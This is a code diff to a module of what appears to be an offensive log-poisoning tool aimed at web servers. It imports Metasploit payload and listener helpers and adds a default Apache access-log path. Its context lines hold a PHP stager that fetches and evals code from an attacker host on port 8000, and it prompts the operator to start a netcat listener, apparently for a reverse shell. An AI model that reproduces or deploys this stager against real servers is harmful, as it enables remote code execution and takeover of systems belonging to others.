@@ -1,18 +1,27 @@
 import subprocess
 from os.path import abspath, dirname, join
 
-from .utils import listener, attack, colors, cook, msf_payload
+from .utils import (
+    listener,
+    attack,
+    colors,
+    cook,
+    msf_payload,
+    prompt_input,
+    resolve_location,
+)
 
 from .Detection import Detection
 
 STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
+DEFAULT_ACCESS_LOG = "/var/log/apache2/access.log"
 HERE = abspath(dirname(__file__))
 
 
 class Logs:
     def __init__(self, args):
         self.target = args.url
-        self.location = args.location
+        self.location = resolve_location(args.location, DEFAULT_ACCESS_LOG)
         self.nostager = args.nostager
         self.relative = args.relative
         self.cookies = args.cookies
@@ -57,7 +66,7 @@ class Logs:
                 print(colors("[!] Process Error", 91))
                 print(e)
 
-        input(
+        prompt_input(
             colors(
                 "[?] Press Enter To Continue When Your netcat listener is Running ...",
                 94,
